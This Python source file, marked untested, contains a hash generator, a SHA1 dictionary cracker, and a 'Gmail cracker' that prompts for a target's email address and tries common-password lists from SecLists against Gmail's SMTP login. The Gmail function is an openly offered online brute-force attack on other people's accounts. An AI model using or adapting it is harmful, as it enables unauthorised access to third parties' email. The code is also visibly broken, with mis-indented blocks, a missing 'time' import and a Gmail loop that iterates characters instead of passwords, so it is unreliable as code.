import os
import smtplib
import hashlib
import urllib.request
from colorama import Fore


# UNTESTED

def HASHER():

    os.system('cls' if os.name == 'nt' else 'clear')
    hasherLOGO = """
  _    _           _____ _    _ ______ _____  
 | |  | |   /\    / ____| |  | |  ____|  __ \ 
 | |__| |  /  \  | (___ | |__| | |__  | |__) |
 |  __  | / /\ \  \___ \|  __  |  __| |  _  / 
 | |  | |/ ____ \ ____) | |  | | |____| | \ \ 
 |_|  |_/_/    \_|_____/|_|  |_|______|_|  \_\ 
_______________________________________________
    """
    print(hasherLOGO)
    hashValue = input("Enter String to Hash: ")

    #MD5 Hash
    hashmd5 = hashlib.md5()
    hashmd5.update(hashValue.encode())
    print("MD5 Hash: " + hashmd5.hexdigest())

    #SHA1 Hash
    hashsha1 = hashlib.sha1();
    hashsha1.update(hashValue.encode())
    print("SHA1 Hash: " + hashsha1.hexdigest())

    #SHA224 Hash
    hashsha224 = hashlib.sha224()
    hashsha224.update(hashValue.encode())
    print("SHA224 Hash: " + hashsha224.hexdigest())
    
    #SHA256 Hash
    hashsha256 = hashlib.sha256()
    hashsha256.update(hashValue.encode())
    print("SHA256 Hash: " + hashsha256.hexdigest())

    #SHA512 Hash
    hashsha512 = hashlib.sha512()
    hashsha512.update(hashValue.encode())
    print("SHA512 Hash: " + hashsha512.hexdigest())


def SHA1_Cracker():

    os.system('cls' if os.name == 'nt' else 'clear')
    Sha1_Cracker_LOGO = """
   _____ _    _         __      _____ _____           _____ _  ________ _____  
  / ____| |  | |   /\  /_ |    / ____|  __ \    /\   / ____| |/ |  ____|  __ \ 
 | (___ | |__| |  /  \  | |   | |    | |__) |  /  \ | |    | ' /| |__  | |__) |
  \___ \|  __  | / /\ \ | |   | |    |  _  /  / /\ \| |    |  < |  __| |  _  / 
  ____) | |  | |/ ____ \| |   | |____| | \ \ / ____ | |____| . \| |____| | \ \ 
 |_____/|_|  |_/_/    \_|_|    \_____|_|  \_/_/    \_\_____|_|\_|______|_|  \_\ 
 ________________________________________________________________________________
    """
    print(Sha1_Cracker_LOGO)
    sha1hash = input('[*] Enter SHA1 Hash: ')

    Pass_list_Options = """
    [!] Note: The longer the password list
    the longer the duration, however
    better the odds.
    ----------------------------------
    [1]-- Top 100  Most Used Passwords
    [2]-- Top 1K   Most Used Passwords
    [3]-- Top 10K  Most Used Passwords
    [4]-- Top 100K Most Used Passwords
    [5]-- Top 1Mil Most Used Passwords
    """
    print(Pass_list_Options)
    Decision = input("Pick a Password List: ")
    
    if Decision == "1":
    #Top 100
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt').read(), 'UTF-8')
    
    elif Decision == "2":
    #Top 1k
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt').read(), 'UTF-8')
    
    elif Decision == "3":
    #Top 10K
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'UTF-8')

    elif Decision == "4":
    #Top 100K
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt').read(), 'UTF-8')

    elif Decision == "5":
    #Top 1Mil
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt').read(), 'UTF-8')

    else:
        print("Defaulting to the Top 500 password list")
        time.sleep(2.5)
        #Top 1k
        passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-500.txt').read(), 'UTF-8')

    os.system('cls' if os.name == 'nt' else 'clear')
    print(Sha1_Cracker_LOGO)

    for password in passList.split('\n'):
        hashGuess = hashlib.sha1(bytes(password, 'UTF-8')).hexdigest()
        if hashGuess == sha1hash:
            print(Fore.GREEN + "[+] Password Found: " + str(password))
            quit()
        else:
            print(Fore.RED + '[-] Password not found. Trying next password...')
            pass

    print("Password Not Found in Password List")


def Gmail_Cracker():
    Gmail_Cracker_Logo = """
   _____ __  __          _____ _         _____ _____            _____ _  ________ _____  
  / ____|  \/  |   /\   |_   _| |       / ____|  __ \     /\   / ____| |/ /  ____|  __ \ 
 | |  __| \  / |  /  \    | | | |      | |    | |__) |   /  \ | |    | ' /| |__  | |__) |
 | | |_ | |\/| | / /\ \   | | | |      | |    |  _  /   / /\ \| |    |  < |  __| |  _  / 
 | |__| | |  | |/ ____ \ _| |_| |____  | |____| | \ \  / ____ \ |____| . \| |____| | \ \ 
  \_____|_|  |_/_/    \_\_____|______|  \_____|_|  \_\/_/    \_\_____|_|\_\______|_|  \_\ 
__________________________________________________________________________________________
    """
    print(Gmail_Cracker_Logo)

    smtpServer = smtplib.SMTP("smtp.gmail.com", 587)
    smtpServer.ehlo()
    smtpServer.starttls()

        Pass_list_Options = """
    [!] Note: The longer the password list
    the longer the duration, however
    better the odds.
    ----------------------------------
    [1]-- Top 100  Most Used Passwords
    [2]-- Top 1K   Most Used Passwords
    [3]-- Top 10K  Most Used Passwords
    [4]-- Top 100K Most Used Passwords
    [5]-- Top 1Mil Most Used Passwords
    """
    user = input("Enter Target Email Address: ")
    print(Pass_list_Options)
    Decision = input("Pick a Password List: ")
    
    if Decision == "1":
    #Top 100
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt').read(), 'UTF-8')
    
    elif Decision == "2":
    #Top 1k
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt').read(), 'UTF-8')
    
    elif Decision == "3":
    #Top 10K
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').read(), 'UTF-8')

    elif Decision == "4":
    #Top 100K
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt').read(), 'UTF-8')

    elif Decision == "5":
    #Top 1Mil
    passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt').read(), 'UTF-8')

    else:
        print("Defaulting to the Top 1K password list")
        time.sleep(2.5)
        #Top 1k
        passList = str(urllib.request.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt').read(), 'UTF-8')

    os.system('cls' if os.name == 'nt' else 'clear')


    for password in passList:
        password = password.strip('\n')
        try:
            smtpServer.login(user, password)
            print('[+] Password Found: %s' % password) 
        except smtplib.SMTPAuthenticationError:
            print('[-] Wrong Password: %s' % password)



if __name__ == '__main__':
    pass